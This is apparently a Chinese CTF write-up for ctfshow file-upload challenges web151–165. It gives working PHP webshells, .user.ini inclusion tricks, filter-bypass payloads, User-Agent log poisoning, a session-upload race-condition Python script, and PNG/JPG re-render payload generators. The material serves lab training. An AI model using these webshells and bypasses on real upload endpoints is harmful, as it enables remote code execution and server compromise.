---
title: ctfshow文件上传
date: 2025-09-06 16:55:54
tags:
- CTF
- Web
- 文件上传
- 木马上传
- 命令执行RCE
- 日志包含
- Linux系统命令
- session条件竞争
- Webshell
- session条件竞争
categories:
- ctfshow-web入门wp
description: " "
---



# web151

**1.前端校验**

**指在用户提交数据之前，由浏览器或客户端对数据进行验证。常见方式有：**

- **JavaScript 编写校验逻辑**
- **HTML 表单属性（如 `required`、`pattern` 等）**

**作用：提升用户体验，减少无效提交。**

**2.后端验证**

**指服务器在接收到用户提交的数据后，对其进行校验和过滤，确保数据符合预期。**

**作用：保证数据的安全性与正确性，防止恶意提交。**

**3.总结**

- **前端校验：提升用户体验，但容易被绕过。**
- **后端验证：确保数据安全，必须执行。**
- **仅有前端校验而缺少后端验证，形同虚设。**

&nbsp;



**==题解一==**

**查看源代码得知上传图片格式限制为 `png` ，将其修改为 `php` 格式**

<img src="\images\article_images\image-20250818173725365.png" alt="image-20250818173725365" style="zoom:25%;" />

&nbsp;



**上传一句话木马**

```php
<?php @eval($_POSY[a]);?>
```

<img src="\images\article_images\image-20250818174234099.png" alt="image-20250818174234099" style="zoom: 33%;" />

&nbsp;



<img src="\images\article_images\image-20250818173757367.png" alt="image-20250818173757367" style="zoom:25%;" />

&nbsp;



**访问文件保存路径 `靶机/upload/muma.php` 并进行 rce**

**查看上一级目录**

```php
#GET
/upload/muma.php

#POST
a=system("ls ../");
```

<img src="\images\article_images\image-20250818173838837.png" alt="image-20250818173838837" style="zoom:25%;" />

&nbsp;



**查看flag**

```php
#GET
/upload/muma.php

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818173939197.png" alt="image-20250818173939197" style="zoom:25%;" />

&nbsp;



**==题解二==**

**制作一句话木马图片**

**在 `txt` 中写入一句话木马，修改 `muma.txt` 文件名后缀，重命名为 `muma.png`**

<img src="\images\article_images\image-20250818175506878.png" alt="image-20250818175506878" style="zoom:25%;" />

&nbsp;



**上传 `png` 文件并抓包**

**在Repeater中修改 `png` 为 `php`**

<img src="\images\article_images\image-20250818175748747.png" alt="image-20250818175748747" style="zoom:33%;" />

&nbsp;



**连接蚁剑拿到flag（ `靶机/upload/muma.php` ；密码：`a` ）**

<img src="\images\article_images\image-20250818180017322.png" alt="image-20250818180017322" style="zoom: 33%;" />

&nbsp;



---

# web152

**Content-Type 校验**

**`Content-Type` 是 HTTP 协议中的一个头字段，用于指示发送给接收方的数据的媒体类型（也称为MIME类型）**

- **机制：服务器除了看文件扩展名，还会检查上传请求中的 HTTP 头部 `Content-Type`。**
  **例如：**

  ```php
  Content-Type: image/png
  ```

  **如果不是图片类型，就拒绝上传。**

- **考点：MIME 类型伪造。**

  1. **浏览器/工具上传时，`Content-Type` 是由客户端自己声明的。**

  2. **这意味着攻击者完全可以在 BurpSuite、Postman、curl 中篡改请求头，把一个 PHP 文件伪装成：**

     ```php
     Content-Type: image/png
     ```

  3. **服务器如果只信任 `Content-Type`，那其实依然能上传成功。**

&nbsp;



> **常见的 Content-Type 值**
>
> **1.文本类型:**
>
> - **text/html: HTML 文档**
>
> - **text/plain: 纯文本**
>
> - **text/css: CSS 样式表**
>
> - **text/javascript: JavaScript 文件**
>
> &nbsp;
>
> 
>
> **2.应用类型:**
>
> - **application/json: JSON 数据格式**
>
> - **application/xml: XML 数据格式**
>
> - **application/x-www-form-urlencoded: 表单数据，以键值对方式编码，通常用于 POST 请求**
>
> - **multipart/form-data: 表单数据，通常用于文件上传时**
>
> &nbsp;
>
> 
>
> **3.图片类型:**
>
> - **image/jpeg: JPEG 图像**
>
> - **image/png: PNG 图像**
> - **image/gif: GIF 图像**
>
> &nbsp;
>
> 
>
> **4.音频/视频类型:**
>
> - **audio/mpeg: MP3 音频**
> - **video/mp4: MP4 视频**

&nbsp;



**因此，这一题不能通过修改源代码直接上传php木马解题**

&nbsp;





**同样上传 `muma.png` 并抓包，在Repeater中修改 `png` 为 `php`**

<img src="\images\article_images\image-20250818193032111.png" alt="image-20250818193032111" style="zoom:25%;" />

&nbsp;



**查看flag**

```php
#GET
/upload/muma.php

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818192416603.png" alt="image-20250818192416603" style="zoom:25%;" />

&nbsp;



---

# web153

**`php.ini`：全局配置文件，影响整个 PHP 环境。**

**`.user.ini`：目录级配置文件，只影响所在目录及子目录（类似 `.htaccess`）；用户可以通过 `.user.ini` 文件来设置特定目录和子目录下的 PHP 配置。这些设置会覆盖全局 `php.ini` 的相应配置。**
**可以通过配置选项使每个php文件头或文件尾都进行文件包含**

```php
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
```

**原理：上传 `.user.ini`，指定一个文件（如 `a.jpg`），那么该文件就会被包含在要执行的php文件中（如 `index.php`），类似于在`index.php` 中插入一句：`require(./a.jpg)` ；**
**PHP 执行当前目录的任意 `.php` 文件时，会 `require a.jpg`**
**这两个设置的区别只是在于 `auto_prepend_file` 是在文件前插入；`auto_append_file` 在文件最后插入（当文件调用的有 `exit()` 时，该设置无效）**
**所以要求当前目录必须要有php文件**

**`.user.ini` 可以把指定的一个文件包含到目录下==所有==会以php执行的文件中（比如 `index.php`、`test.php`），当访问 `index.php` 后，这个被指定的文件，无论后缀是什么，都会以php的方式进行读取，所以可以绕过后端检测**

&nbsp;



**能够访问 `靶机/upload` ，说明 `upload` 目录下存在 `.php` 文件**

**或者可以通过扫描 `靶机/upload` 后台，看到目录下有一个 `index.php` 文件**

<img src="\images\article_images\image-20250818222405430.png" alt="image-20250818222405430" style="zoom:80%;" />



&nbsp;



**`1.png` 内容**

```php
auto_prepend_file=muma.png
```

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

&nbsp;



<img src="\images\article_images\image-20250818215940876.png" alt="image-20250818215940876" style="zoom:33%;" />

&nbsp;



**上传 `muma.png`**

<img src="\images\article_images\image-20250818220259213.png" alt="image-20250818220259213" style="zoom:25%;" />



&nbsp;



```php
#GET
/upload/index.php

#POST
a=system("ls ../");
```

<img src="\images\article_images\image-20250818221044605.png" alt="image-20250818221044605" style="zoom:25%;" />

&nbsp;





```php
#GET
/upload/index.php

#POST
a=system("tac ../flag.php")
```

<img src="\images\article_images\image-20250818221114730.png" alt="image-20250818221114730" style="zoom:25%;" />

&nbsp;



---

# web154

**`1.png` 内容**

```php
auto_prepend_file=muma.png
```

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250818224418932.png" alt="image-20250818224418932" style="zoom:25%;" />

&nbsp;



**上传 `muma.png` ，出现 `文件内容不合理` 提示**

<img src="\images\article_images\image-20250818224735310.png" alt="image-20250818224735310" style="zoom:25%;" />

&nbsp;



**修改 `muma,png` 内容，利用短标签代替 `php` 可绕过**

```php
<?= @eval($_POST[a]);?>
<?Php @eval($_POST[a]);?>
```

**查看目录**

```php
#GET
/upload/

#POST
a=system("ls ../");
```

<img src="\images\article_images\image-20250818225238212.png" alt="image-20250818225238212" style="zoom:20%;" />

&nbsp;



**查看flag**

```php
#GET
/upload/

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818225312977.png" alt="image-20250818225312977" style="zoom:20%;" />

&nbsp;



---

# web155

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250818230807703.png" alt="image-20250818230807703" style="zoom:25%;" />

&nbsp;



**上传 `muma.png`，这一题过滤 `php`(包括大小写）** 

<img src="\images\article_images\image-20250818230935547.png" alt="image-20250818230935547" style="zoom:25%;" />

&nbsp;



```php
#GET
/upload/
或者
/upload/index.php

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818231158000.png" alt="image-20250818231158000" style="zoom:25%;" />

&nbsp;



---

# web156

**==题解一==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250818232533231.png" alt="image-20250818232533231" style="zoom:25%;" />

&nbsp;



**上传 `muma.png`，这一题过滤 `php`、 `[`**

**使用 `{}` 代替 `[]` 绕过** 

<img src="\images\article_images\image-20250818232518013.png" alt="image-20250818232518013" style="zoom:25%;" />

&nbsp;



```php
#GET
/upload/

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818232502599.png" alt="image-20250818232502599" style="zoom:25%;" />

&nbsp;



**==题解二==**

**直接将 `auto_prepend_file` 改为 `1.txt`**

<img src="\images\article_images\image-20250818235436046.png" alt="image-20250818235436046" style="zoom:25%;" />

&nbsp;



**直接上传 `1.txt` ，内容为 `<?= system(‘tac ../flag.???’)?>`**

<img src="\images\article_images\image-20250818235403094.png" alt="image-20250818235403094" style="zoom:25%;" />

&nbsp;



**直接访问 `靶机/upload` 拿到flag**

<img src="\images\article_images\image-20250818235502235.png" alt="image-20250818235502235" style="zoom:25%;" />

&nbsp;





---

# web157

**==题解一==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250818234431522.png" alt="image-20250818234431522" style="zoom:25%;" />

&nbsp;



**上传 `muma.png`，这一题过滤 `php`、 `[]`、`{}` 、`;`**

**`array_pop()` 将数组中最后一个元素取出并删除**
**使用 `$_POST` 接受任意变量**

```php
<?= @eval(array_pop($_POST))?>
```

<img src="\images\article_images\image-20250818234404492.png" alt="image-20250818234404492" style="zoom:25%;" />

&nbsp;



```php
#GET
/upload/

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250818234343209.png" alt="image-20250818234343209" style="zoom:25%;" />

&nbsp;



**==题解二==**

**直接将 `auto_prepend_file` 改为 `1.txt`**

**这一题过滤了 `system` 函数**

**直接上传 `1.txt` ，内容为 ``<?= `(‘tac ../flag.???’)`?>``**

**直接访问 `靶机/upload` 拿到flag**

&nbsp;



---

# web158

**上传 `1.png` 并抓包，重命名为 `.user.ini` **

<img src="\images\article_images\image-20250819000053481.png" alt="image-20250819000053481" style="zoom:80%;" />

&nbsp;



**上传 `muma.png`，这一题过滤 `php`、 `[]`、`{}` 、`;` 、`log`**

**`array_pop()` 将数组中最后一个元素取出并删除**
**使用 `$_POST` 接受任意变量**

<img src="\images\article_images\image-20250819000027970.png" alt="image-20250819000027970" style="zoom:80%;" />

&nbsp;



```php
#GET
/upload/

#POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250819000007796.png" alt="image-20250819000007796" style="zoom:25%;" />

&nbsp;



---

# web159

**==题解一==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250819134826160.png" alt="image-20250819134826160" style="zoom: 25%;" />

&nbsp;



**上传 `muma.png`，这一题过滤 `php`、 `[]`、`{}` 、`;` 、`log`、`(`**

```php
<?= `tac ../flag.???`?>
```

<img src="\images\article_images\image-20250819135336499.png" alt="image-20250819135336499" style="zoom:25%;" />

&nbsp;



```php
#GET
/upload/
```

<img src="\images\article_images\image-20250819135308470.png" alt="image-20250819135308470" style="zoom:25%;" />

&nbsp;



**==题解二==**

**日志包含**

&nbsp;



**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250819164024580.png" alt="image-20250819164024580" style="zoom:25%;" />

&nbsp;



**执行日志文件**

```php
<?include '/var/lo'.'g/nginx/access.l'.'og'?>
```

<img src="\images\article_images\image-20250819164002362.png" alt="image-20250819164002362" style="zoom:80%;" />

&nbsp;



**访问 `靶机/upload` 可以查看日志内容，同时在 `User-Agent` 写入一句话木马**

**注入后在日志内容可以看见 `aaa` 标记 ，表明写入成功**

```php
#GET
/upload/

#User-Agent
aaa<?php @eval($_POST[a]);?>
```

<img src="\images\article_images\image-20250819163829147.png" alt="image-20250819163829147" style="zoom:25%;" />

&nbsp;



**连接蚁剑（`靶机/upload/`)**

**查看flag**

<img src="\images\article_images\image-20250819163924591.png" alt="image-20250819163924591" style="zoom:25%;" />

&nbsp;



---

# web160

**==题解一==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250819165424855.png" alt="image-20250819165424855" style="zoom:25%;" />

&nbsp;



**执行日志文件，这一题过滤 `php`、 `[]`、`{}` 、`;` 、`log`、`(` 、`空格`**

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

<img src="\images\article_images\image-20250819165409321.png" alt="image-20250819165409321" style="zoom:25%;" />

&nbsp;



**访问 `靶机/upload` 可以查看日志内容，同时在 `User-Agent` 写入一句话木马**

**注入后在日志内容可以看见 `aaa` 标记 ，表明写入成功**

```php
#GET
/upload/

#User-Agent
aaaaa<?php @eval($_POST[a]);?>
```

<img src="\images\article_images\image-20250819165353188.png" alt="image-20250819165353188" style="zoom:25%;" />

&nbsp;



**连接蚁剑（`靶机/upload/`)**

**查看flag**

<img src="\images\article_images\image-20250819165250645.png" alt="image-20250819165250645" style="zoom:25%;" />

&nbsp;



**==题解二==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`**

<img src="\images\article_images\image-20250819170103240.png" alt="image-20250819170103240" style="zoom:25%;" />

&nbsp;



**php伪协议**

```php
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?>
```

<img src="\images\article_images\image-20250819170048632.png" alt="image-20250819170048632" style="zoom:25%;" />

&nbsp;



**访问 `upload` ，`base64` 解码得到flag**

```php
#GET
/upload/
```

<img src="\images\article_images\image-20250819170003662.png" alt="image-20250819170003662" style="zoom:25%;" />

&nbsp;



---

# web161

```scss
getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求
```

**后端会检测png文件是否真的为png，所以要在图片头加上 `GIF89a`**

&nbsp;



**上传 `1.png` 并抓包，重命名为 `.user.ini`，加上 `GIF86a`**

```php
GIF89a
auto_prepend_file="muma.png"
```

<img src="\images\article_images\image-20250819171303205.png" alt="image-20250819171303205" style="zoom:25%;" />

&nbsp;



**php伪协议，加上 `GIF86a`**

```php
GIF89a
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?>
```

<img src="\images\article_images\image-20250819171534908.png" alt="image-20250819171534908" style="zoom:25%;" />

&nbsp;



**访问 `upload` ，`base64` 解码得到flag**

```php
#GET
/upload/
```

<img src="\images\article_images\image-20250819171519897.png" alt="image-20250819171519897" style="zoom:25%;" />

&nbsp;





---

# web162

**==题解一==**

**session文件上传竞争**

&nbsp;



**上传 `1.png` 并抓包，重命名为 `.user.ini`，加上 `GIF86a`**

```php
GIF89a
auto_prepend_file=/tmp/sess_love
```

<img src="\images\article_images\image-20250819181816577.png" alt="image-20250819181816577" style="zoom:25%;" />

&nbsp;



**利用 `POST.html` 上传任意一个文件**

**注意在相应位置修改靶机地址和命令**

```html
<!DOCTYPE html>
<html>
<body>
<!-- 修改靶机地址 -->
<form action="http://4cd3d241-1c9b-41b4-8616-b78eca5347a6.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
<!-- 修改命令 -->
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system("tac ../flag.php");?>" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
```

&nbsp;



**将抓到的包发送到 `Intruder` 爆破模块**

**在 `cookie` 后添加 `PHPSESSID=love`（ `PHPSESSID` 的值任意）**

**如下示例**

```ini
Cookie: PHPSESSID=love
```

**注意没有 `payload` 插入点**

**设置 `Payload type` 为 `Null payloads`**

**勾选 `Continue indefinitely` 无限重复**

<img src="\images\article_images\image-20250819182340513.png" alt="image-20250819182340513" style="zoom:25%;" />

&nbsp;



**新建 `Resource pool` 资源池，设置线程 `30`**

**`Start attack` 开始爆破，不断上传文件**

<img src="\images\article_images\image-20250819181747316.png" alt="image-20250819181747316" style="zoom:25%;" />

&nbsp;



**访问 `靶机/upload/index.php` 并抓包**

> **访问 `靶机/upload/index.php`**
>
> **相当于在 `index.php` 文件中执行 `include /tmp/sess_love`**

**同上（这里不需要对 `cookie` 进行修改处理）**

**将抓到的包发送到 `Intruder` 爆破模块，注意没有 `payload` 插入点**

**设置 `Payload type` 为 `Null payloads`**

**勾选 `Continue indefinitely` 无限重复**

**新建 `Resource pool` 资源池，设置线程 `80` (访问包的线程数需要大于上传包的线程数)**

**`Start attack` 开始爆破，不断访问文件**

<img src="\images\article_images\image-20250819181656530.png" alt="image-20250819181656530" style="zoom:25%;" />

&nbsp;





**查看访问 `靶机/upload/index.php` 的包的爆破结果**

**根据 `Length` 长度的不同找到命令的回显**

<img src="\images\article_images\image-20250819181614865.png" alt="image-20250819181614865" style="zoom:25%;" />

&nbsp;



**==题解二==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`，加上 `GIF86a`**

```php
GIF89a
auto_prepend_file=/tmp/sess_love
```

<img src="\images\article_images\image-20250819181816577.png" alt="image-20250819181816577" style="zoom:25%;" />

&nbsp;



**脚本实现条件竞争**

<img src="\images\article_images\image-20250819194618891.png" alt="image-20250819194618891" style="zoom:25%;" />

&nbsp;



**多线程并发注入脚本**

```python
import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = 'http://b20a06b7-799e-48aa-a105-0e1827adbf09.challenge.ctf.show/'

# === [2] 自定义参数 ===
PHPSESSID = 'love'
PAYLOAD = '<?php system("cat ../flag.php");?>aaaaa'   # 修改命令，自定义标识符
IDENTIFIER = 'aaaaa'  # 用于判断是否成功执行
TARGET_SESS_PATH = 'upload/index.php'    # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD
    }

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b'A' * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies={'PHPSESSID': PHPSESSID},
                data=data,
                files={'file': (f'upload_{thread_id}.txt', fake_file)},
                timeout=3
            )
            print(f'[Upload-{thread_id}] Upload OK')
        except Exception as e:
            print(f'[Upload-{thread_id}] Error: {e}')

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f'{url}{TARGET_SESS_PATH}', timeout=2)     # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f'\n[+] [Read-{thread_id}] Payload executed successfully!\n')
                print(response.text)
                found_flag.set()
                break
            else:
                print(f'[-] [Read-{thread_id}] Not ready')
        except Exception as e:
            print(f'[Read-{thread_id}] Error: {e}')
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print("\n[+] Done. Exiting all threads.")

# === [7] 执行入口 ===
if __name__ == '__main__':
    main()
```

&nbsp;



---

# web163

**==题解一==**

**php伪协议**

&nbsp;



**==题解二==**

**同 web162：BurpSuite内条件竞争**

&nbsp;





**==题解三==**

**上传 `1.png` 并抓包，重命名为 `.user.ini`，加上 `GIF86a`**

```php
GIF89a
auto_prepend_file=/tmp/sess_love
```

<img src="\images\article_images\image-20250819212648602.png" alt="image-20250819212648602" style="zoom:25%;" />

&nbsp;



**脚本实现条件竞争**

<img src="\images\article_images\image-20250819212528233.png" alt="image-20250819212528233" style="zoom:25%;" />

&nbsp;



**多线程并发注入脚本**

```python
import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = 'http://68227ebf-cab1-4403-9a8c-86cda1177f67.challenge.ctf.show/'

# === [2] 自定义参数 ===
PHPSESSID = 'love'
PAYLOAD = '<?php system("tac ../flag.php");?>aaaaa'   # 修改命令，自定义标识符
IDENTIFIER = 'aaaaa'  # 在回显里找 aaaaa; 用于判断是否成功执行
TARGET_SESS_PATH = 'upload/index.php'    # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD
    }

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b'A' * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies={'PHPSESSID': PHPSESSID},
                data=data,
                files={'file': (f'upload_{thread_id}.txt', fake_file)},
                timeout=3
            )
            print(f'[Upload-{thread_id}] Upload OK')
        except Exception as e:
            print(f'[Upload-{thread_id}] Error: {e}')

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f'{url}{TARGET_SESS_PATH}', timeout=2)     # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f'\n[+] [Read-{thread_id}] Payload executed successfully!\n')
                print(response.text)
                found_flag.set()
                break
            else:
                print(f'[-] [Read-{thread_id}] Not ready')
        except Exception as e:
            print(f'[Read-{thread_id}] Error: {e}')
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print("\n[+] Done. Exiting all threads.")

# === [7] 执行入口 ===
if __name__ == '__main__':
    main()

```

&nbsp;



---

# web164

**`png` 二次渲染与绕过**

**1.二次渲染？**

- **定义**：当用户上传文件（如图片、文档）后，网站会对文件进行再处理（即二次渲染），以适配显示需求或进行安全过滤。
- **常见原因**：
  1. **适配展示**：压缩、缩放图片，转换格式（如 PNG → JPG）。
  2. **安全考虑**：清理潜在木马代码，防止图片木马、恶意脚本注入。

**2.二次渲染的影响**

- 用户上传的原始文件和服务器保存的文件 **并不完全一致**。
- 如果攻击者直接在文件中写入 Webshell，很可能在渲染过程中被修改或清理掉。

**3.绕过二次渲染的思路**

**（1）对比差异**

- 将上传前的源文件与上传后的处理结果进行比对。
- 找出哪些数据段被修改、哪些数据段保持不变。

**（2）选择安全区域**

- 在 **不会被二次渲染修改的数据区域** 插入恶意代码。
- 这样上传后的文件仍然包含可执行的后门代码。

**4.需要脚本**

- 文件渲染后的差异分布 **复杂且不可预测**。

- 手工分析、插入代码几乎不可能成功。

- 需要使用脚本来自动：

  （1）上传 → 下载已渲染文件

  （2）比对文件差异

  （3）在合适位置自动写入恶意代码

  （4）重新构造“图片马”并循环测试

&nbsp;



**查看源代码**

<img src="\images\article_images\image-20250820003944731.png" alt="image-20250820003944731" style="zoom:25%;" />

```html
</div>
<script src="js/layui.js"></script>
<script>
layui.use('upload', function(){
  var upload = layui.upload;
   
  //执行实例
  var uploadInst = upload.render({
    elem: '#upload' //绑定元素
    ,url: '/upload/' //上传接口
    ,done: function(res){
    	if(res.code==0){
    		$("#result").html("文件上传成功 <a href='download.php?image="+res.msg+"' target='_blank'>查看图片</a>");
    	}else{
    		$("#result").html("文件上传失败，失败原因："+res.msg);
    	}
      
    }
    ,error: function(){
      $("#result").html("文件上传失败");
    }
  });
});
```

&nbsp;



**可以看到源代码有个 `download.php?image=`，基本确定考点为二次渲染**

&nbsp;



**利用脚本生成 `png` 图，其内容为 `<?$_GET[0]($_POST[1]);?>`**

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'re_encoded.png');
```

<img src="\images\article_images\image-20250820004455587.png" alt="image-20250820004455587" style="zoom: 25%;" />



&nbsp;



**上传脚本生成的木马图，查看图片**

```php
#GET
靶机?image=...&0=system

#POST
1=ls
```

<img src="\images\article_images\image-20250820004726742.png" alt="image-20250820004726742" style="zoom:25%;" />

&nbsp;



**将图片保存下来，查看图片内容**

<img src="\images\article_images\image-20250820003154047.png" alt="image-20250820003154047" style="zoom:25%;" />

&nbsp;



```php
#GET
靶机?image=...&0=system

#POST
1=tac flag.php
```

<img src="\images\article_images\image-20250820004912573.png" alt="image-20250820004912573" style="zoom:25%;" />

&nbsp;



**将图片保存下来，查看图片内容**

<img src="\images\article_images\image-20250820003757010.png" alt="image-20250820003757010" style="zoom:25%;" />

&nbsp;



---

# web165

**`jpg` 二次渲染**

&nbsp;



**将这张 `jpg` 图片上传经过一次渲染后下载下来**

<img src="\images\article_images\image-20250820135624000.png" alt="image-20250820135624000" style="zoom:10%;" />

&nbsp;



**将下载后的 `jpg` 图片用脚本进行处理得到二次渲染后的 `jpg` 图片**

<img src="\images\article_images\image-20250820135534124.png" alt="image-20250820135534124" style="zoom:25%;" />

```php
<?php
	/*
    将 payload 注入到 JPG 图片的算法，可以保证在经过 PHP 函数 imagecopyresized() 和 imagecopyresampled() 转换后仍然保持不变。
    要求：初始图片的大小和质量必须与处理后的图片一致。

    步骤：
    1) 通过安全的文件上传脚本上传任意一张图片；
    2) 保存处理后的图片，然后执行：
    jpg_payload.php <jpg_name.jpg>

    如果注入成功，你会得到一张特殊构造的图片，需要再次上传。

    注意可能的问题：
    1) 经过第二次处理后，注入的数据可能会部分损坏；
    2) jpg_payload.php 脚本输出 "Something's wrong"。
    如果遇到这种情况，可以尝试修改 payload（例如在开头加一些符号），或者换一张初始图片再试。

	*/

	$miniPayload = '<?=eval($_POST[1]);?>';         # 修改命令


	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    	die('php-gd is not installed');
	}
	
	if(!isset($argv[1])) {
		die('php jpg_payload.php <jpg_name.jpg>');
	}

	set_error_handler("custom_error_handler");

	for($pad = 0; $pad < 1024; $pad++) {
		$nullbytePayloadSize = $pad;
		$dis = new DataInputStream($argv[1]);
		$outStream = file_get_contents($argv[1]);
		$extraBytes = 0;
		$correctImage = TRUE;

		if($dis->readShort() != 0xFFD8) {
			die('Incorrect SOI marker');
		}

		while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
			$marker = $dis->readByte();
			$size = $dis->readShort() - 2;
			$dis->skip($size);
			if($marker === 0xDA) {
				$startPos = $dis->seek();
				$outStreamTmp = 
					substr($outStream, 0, $startPos) . 
					$miniPayload . 
					str_repeat("\0",$nullbytePayloadSize) . 
					substr($outStream, $startPos);
				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
				if($extraBytes !== 0) {
					while((!$dis->eof())) {
						if($dis->readByte() === 0xFF) {
							if($dis->readByte !== 0x00) {
								break;
							}
						}
					}
					$stopPos = $dis->seek() - 2;
					$imageStreamSize = $stopPos - $startPos;
					$outStream = 
						substr($outStream, 0, $startPos) . 
						$miniPayload . 
						substr(
							str_repeat("\0",$nullbytePayloadSize).
								substr($outStream, $startPos, $imageStreamSize),
							0,
							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
								substr($outStream, $stopPos);
				} elseif($correctImage) {
					$outStream = $outStreamTmp;
				} else {
					break;
				}
				if(checkImage('payload_'.$argv[1], $outStream)) {
					die('Success!');
				} else {
					break;
				}
			}
		}
	}
	unlink('payload_'.$argv[1]);
	die('Something\'s wrong');

	function checkImage($filename, $data, $unlink = FALSE) {
		global $correctImage;
		file_put_contents($filename, $data);
		$correctImage = TRUE;
		imagecreatefromjpeg($filename);
		if($unlink)
			unlink($filename);
		return $correctImage;
	}

	function custom_error_handler($errno, $errstr, $errfile, $errline) {
		global $extraBytes, $correctImage;
		$correctImage = FALSE;
		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
			if(isset($m[1])) {
				$extraBytes = (int)$m[1];
			}
		}
	}

	class DataInputStream {
		private $binData;
		private $order;
		private $size;

		public function __construct($filename, $order = false, $fromString = false) {
			$this->binData = '';
			$this->order = $order;
			if(!$fromString) {
				if(!file_exists($filename) || !is_file($filename))
					die('File not exists ['.$filename.']');
				$this->binData = file_get_contents($filename);
			} else {
				$this->binData = $filename;
			}
			$this->size = strlen($this->binData);
		}

		public function seek() {
			return ($this->size - strlen($this->binData));
		}

		public function skip($skip) {
			$this->binData = substr($this->binData, $skip);
		}

		public function readByte() {
			if($this->eof()) {
				die('End Of File');
			}
			$byte = substr($this->binData, 0, 1);
			$this->binData = substr($this->binData, 1);
			return ord($byte);
		}

		public function readShort() {
			if(strlen($this->binData) < 2) {
				die('End Of File');
			}
			$short = substr($this->binData, 0, 2);
			$this->binData = substr($this->binData, 2);
			if($this->order) {
				$short = (ord($short[1]) << 8) + ord($short[0]);
			} else {
				$short = (ord($short[0]) << 8) + ord($short[1]);
			}
			return $short;
		}

		public function eof() {
			return !$this->binData||(strlen($this->binData) === 0);
		}
	}
?>
```

&nbsp;



**将二次渲染的 `jpg` 图片上传**

**POST**

```php
1=system("ls > 1.txt");
```

